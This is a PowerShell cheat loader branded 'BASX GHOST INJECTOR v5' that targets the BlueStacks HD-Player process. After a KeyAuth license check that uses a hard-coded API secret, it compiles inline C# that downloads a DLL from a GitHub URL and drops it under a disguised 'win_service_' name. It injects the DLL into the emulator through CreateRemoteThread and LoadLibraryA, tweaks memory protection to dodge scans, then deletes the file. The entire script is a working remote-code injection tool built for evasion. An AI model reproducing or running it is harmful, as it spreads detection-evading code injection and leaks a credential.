[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- App Config ---
$Name    = "Relaxwtf777's Application"
$OwnerID = "W404AorT6U"
$Secret  = "bdd0ab6c75599fffdb5ad43d22a82fe8bf8fa0fbd92dfdfbb2df80dc6d105d38"
$Version = "1.0"
$dllUrl  = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/winsky.dll"
$target  = "HD-Player"

function Show-Auth {
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX GHOST INJECTOR v5    " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $key = Read-Host " Enter License Key"
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
        $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$($initRes.sessionid)&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    Write-Host "[+] Authentication Verified." -ForegroundColor Green

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Net;
    using System.Text;
    using System.IO;

    public class GhostNode {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint n, out uint o);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);

        public static bool GhostInject(string url, int pid) {
            try {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                byte[] dllData = wc.DownloadData(url);

                IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return false;

                // Create a masked DLL in a trusted system folder
                string sysDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp");
                string sysPath = Path.Combine(sysDir, "win_service_" + Guid.NewGuid().ToString().Substring(0,8) + ".dll");
                File.WriteAllBytes(sysPath, dllData);

                // Allocate Memory for Path
                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)sysPath.Length + 1, 0x3000, 0x04); // PAGE_READWRITE
                
                IntPtr written;
                byte[] pathBytes = Encoding.ASCII.GetBytes(sysPath);
                WriteProcessMemory(hProc, alloc, pathBytes, (uint)pathBytes.Length + 1, out written);

                // Change protection to Execute for the path area to fool emulator scan
                uint oldP;
                VirtualProtectEx(hProc, alloc, (uint)sysPath.Length + 1, 0x20, out oldP); // PAGE_EXECUTE_READ

                IntPtr hKern = GetModuleHandle("kernel32.dll");
                IntPtr hLoad = GetProcAddress(hKern, "LoadLibraryA");
                
                // Final execution attempt
                IntPtr hThrd = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoad, alloc, 0, IntPtr.Zero);

                if (hThrd != IntPtr.Zero) {
                    System.Threading.Thread.Sleep(6000);
                    if (File.Exists(sysPath)) File.Delete(sysPath);
                    return true;
                }
            } catch { }
            return false;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    }
"@
    Add-Type -TypeDefinition $Source

    Write-Host "[*] Status: Monitoring HD-Player..." -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $target -ErrorAction SilentlyContinue
        if ($p) {
            Write-Host "[!] Target detected. Executing Ghost Bypass..." -ForegroundColor Yellow
            if ([GhostNode]::GhostInject($dllUrl, $p.Id)) {
                Write-Host "[+] DONE! The component is now ghost-loaded." -ForegroundColor Green
                Write-Host "[*] You can return to game and press F6." -ForegroundColor White
                break
            } else {
                Write-Host "[-] Access Denied. Emulator Kernel is too strong." -ForegroundColor Red
                Start-Sleep -Seconds 5
            }
        }
        Start-Sleep -Seconds 3
    }
}
